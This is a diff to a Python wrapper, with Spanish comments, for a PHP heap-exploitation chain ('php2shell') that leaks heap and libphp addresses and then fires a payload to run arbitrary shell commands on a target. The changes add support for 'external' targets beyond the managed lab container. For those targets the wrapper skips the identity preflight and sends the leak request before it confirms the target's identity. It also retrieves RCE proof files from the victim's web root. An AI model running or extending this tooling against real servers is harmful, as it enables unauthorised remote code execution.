@@ -82,8 +82,9 @@ def guard_loopback(url: str) -> None:
     host = m.group(1) if m else ""
     if host.startswith("127.") or host in ("::1", "localhost"):
         return
-    die(f"refusing non-loopback target '{url}' — este wrapper solo opera contra\n"
-        "     el laboratorio local (127.0.0.1:18081). Cambia la URL a loopback.")
+    die(f"refusing non-loopback target '{url}' — solo objetivos en loopback:\n"
+        "     el lab gestionado (127.0.0.1:18081) o una víctima local en 127.0.0.1\n"
+        "     (p. ej. otra víctima php2shell en otro puerto). Cambia la URL a loopback.")
 
 
 def guard_vendor() -> None:
@@ -101,6 +102,7 @@ def guard_vendor() -> None:
 # Preflight de identidad del target
 # ---------------------------------------------------------------------------
 
+RCE_URL = "http://127.0.0.1:18081/t.php"  # lab gestionado (== URL por defecto del wrapper)
 RCE_CONTAINER = "php2shell-rce-target"
 RCE_IMAGE_DIGEST = (
     "sha256:974e3a920309308e1690ed607e6cc3061d6906f90cc8d30fe519daa48bccf101"
@@ -108,17 +110,35 @@ RCE_IMAGE_DIGEST = (
 
 
 def target_identity(url: str, timeout: float = 5.0) -> dict:
-    """Identidad del target SIN hacer ninguna peticion HTTP.
+    """Identidad del target.
 
-    Por que sin HTTP: la fase de fire esta calibrada sobre la geometria
-    exacta del heap del worker y CUALQUIER request previo (incluso un
-    JSON estatico servido por Apache) desplaza el heap y el carrier no
-    aterriza (verificado: fire 0/5 con preflight HTTP vs 4/4 sin el).
-    La identidad se comprueba por docker:
-      * digest de la imagen del contenedor (build calibrado, offsets OK)
-      * lab/rce/www/identity.json leido con docker exec (marker + version)
+    Lab gestionado (URL por defecto, :18081): SIN ninguna peticion HTTP.
+      Por que sin HTTP: la fase de fire esta calibrada sobre la geometria
+      exacta del heap del worker y CUALQUIER request previo (incluso un
+      JSON estatico servido por Apache) desplaza el heap y el carrier no
+      aterriza (verificado: fire 0/5 con preflight HTTP vs 4/4 sin el).
+      La identidad se comprueba por docker:
+        * digest de la imagen del contenedor (build calibrado, offsets OK)
+        * lab/rce/www/identity.json leido con docker exec (marker + version)
+
+    Target externo (cualquier otra URL): la identidad se lee por HTTP del
+      propio nodo (GET t.php devuelve el JSON de identidad). Solo seguro en
+      modos sin fire (info/leak); el modo rce externo salta este preflight.
     """
     import shutil
+    external = url.rstrip("/") != RCE_URL.rstrip("/")
+    if external:
+        try:
+            with urllib.request.urlopen(url, timeout=timeout) as resp:
+                data = json.loads(resp.read().decode(errors="replace"))
+        except (urllib.error.URLError, OSError, json.JSONDecodeError) as exc:
+            die(f"no pude leer la identidad de {url}: {exc}\n"
+                "     ¿es un nodo php2shell que responde el JSON de identidad?")
+        # El JSON de t.php usa 'version'; el identity.json del lab usa 'php'.
+        # Normalizo para que check_target lea la misma clave en ambas ramas.
+        data.setdefault("php", data.get("version"))
+        data["_via_http"] = True
+        return data
     docker = shutil.which("docker")
     if not docker:
         die("docker CLI no disponible: no puedo verificar la identidad sin HTTP\n"
@@ -158,8 +178,12 @@ def check_target(url: str, quiet: bool = False) -> dict:
         die(f"version PHP inesperada: {version!r} (esperaba {REQUIRED_PHP})")
     if not quiet:
         ok(f"target identificado: {REQUIRED_MARKER}, PHP {version} (fixed: 8.5.12)")
-        note("preflight por docker (digest de imagen + identity.json):")
-        note("cero peticiones HTTP antes de la cadena — el heap queda intacto")
+        if data.get("_via_http"):
+            note("preflight por HTTP (JSON de identidad del propio nodo):")
+            note("válido en modos sin fire; en rce externo el preflight se omite entero")
+        else:
+            note("preflight por docker (digest de imagen + identity.json):")
+            note("cero peticiones HTTP antes de la cadena — el heap queda intacto")
     return data
 
 
@@ -169,10 +193,18 @@ def check_target(url: str, quiet: bool = False) -> dict:
 
 def mode_check(url: str) -> int:
     banner("CHECK — identidad + oracle de leak (sin fire)")
-    check_target(url)
     note("modo seguro: solo la fase de leak; el par de fire NUNCA se envia")
-    rc = run_exploit(["--stage", "leak", "--url", url], tail=8)
-    return rc
+    if url.rstrip("/") != RCE_URL.rstrip("/"):
+        # Target externo: la identidad se lee por HTTP (GET), y CUALQUIER GET
+        # previo desplaza el heap y mata el leak (verificado). Orden invertido:
+        # leak PRIMERO, identidad y gates DESPUES — el chequeo es sin fire,
+        # así que no hay riesgo en disparar el POST del leak sobre un target
+        # cuya identidad se confirma a posteriori.
+        rc = run_exploit(["--stage", "leak", "--url", url, "--php", REQUIRED_PHP], tail=8)
+        check_target(url)
+        return rc
+    check_target(url)
+    return run_exploit(["--stage", "leak", "--url", url, "--php", REQUIRED_PHP], tail=8)
 
 
 # ---------------------------------------------------------------------------
@@ -234,7 +266,16 @@ EXPLAIN = {
 
 def mode_rce(url: str, cmd: str, expect: str, explain: bool, quiet: bool) -> int:
     banner("RCE — cadena completa (leak + fire)")
-    check_target(url, quiet=quiet)
+    if url.rstrip("/") != RCE_URL.rstrip("/"):
+        # Target externo: NO se hace preflight (ni docker ni HTTP) — cualquier
+        # request previo rompe la ventana del fire. La identidad del build la
+        # validan los gates del propio exploit (ventana de plausibilidad del
+        # delta, mayoría de punteros alineados a 2 MiB).
+        if not quiet:
+            note("target externo: preflight omitido (un request previo rompería la ventana del fire)")
+            note("los gates internos del exploit validan el build durante el leak")
+    else:
+        check_target(url, quiet=quiet)
     cmd = cmd.strip()
     if not cmd or not cmd.isascii():
         die(f"comando invalido: {cmd!r} (solo ASCII)")
@@ -279,9 +320,15 @@ def mode_rce(url: str, cmd: str, expect: str, explain: bool, quiet: bool) -> int
     probe_out = probe.stdout + probe.stderr
     leak_m = re.search(r"LEAK heap=(0x[0-9a-f]+) libphp=(0x[0-9a-f]+)", probe_out)
     if probe.returncode != 0 or not leak_m:
+        conn = re.search(r"(Connection refused|timed out|Name or service not known|Errno -?\d+)", probe_out)
+        if conn:
+            die(f"target inalcanzable ({conn.group(1).lower()}): comprueba la URL\n"
+                "     y que el host víctima esté levantado y alcance, sin proxy en medio.")
         delta = re.search(r"delta (0x-?[0-9a-f]+)", probe_out)
         why = f" (delta {delta.group(1)} fuera de la ventana del exploit)" if delta else ""
-        warn(f"boot con geometria no apta{why} — recreando contenedor...")
+        recreate = "recreando contenedor..." if url.rstrip("/") == RCE_URL.rstrip("/") else \
+                   "reintenta tras reiniciar el worker del target (gestión es del lado del servidor)..."
+        warn(f"boot con geometria no apta{why} — {recreate}")
         return 1
     heap, module = leak_m.group(1), leak_m.group(2)
     if not quiet:
@@ -328,15 +375,28 @@ def mode_rce(url: str, cmd: str, expect: str, explain: bool, quiet: bool) -> int
     if m:
         proof = m.group(0).strip()
     else:
-        proof_path = ROOT / "lab" / "rce" / "www" / out_name
-        if proof_path.exists():
+        # Prueba en el docroot: por bind del host (lab gestionado, el fichero
+        # 'o' se lee directamente del mount) o por HTTP GET (target externo).
+        # OJO: la prueba vive en la RAIZ del sitio (/o), nunca bajo t.php —
+        # construir el URL desde la url completa daria /t.php/o (404) y la
+        # prueba se perderia aunque el RCE haya ejecutado.
+        if url.rstrip("/") == RCE_URL.rstrip("/"):
+            stale = ROOT / "lab" / "rce" / "www" / out_name
             try:
-                content = proof_path.read_text(errors="replace")
-                if expect in content:
-                    line = next(l for l in content.splitlines() if expect in l)
-                    proof = line.strip()
+                content = stale.read_text(errors="replace")
             except OSError:
-                pass
+                content = ""
+        else:
+            parsed = urllib.parse.urlsplit(url)
+            root = f"{parsed.scheme}://{parsed.netloc}"
+            try:
+                with urllib.request.urlopen(root + "/" + out_name, timeout=6) as resp:
+                    content = resp.read().decode(errors="replace")
+            except (urllib.error.URLError, OSError):
+                content = ""
+        if content and expect in content:
+            line = next(l for l in content.splitlines() if expect in l)
+            proof = line.strip()
 
     if proof:
         width = max(46, len(proof) + 2)
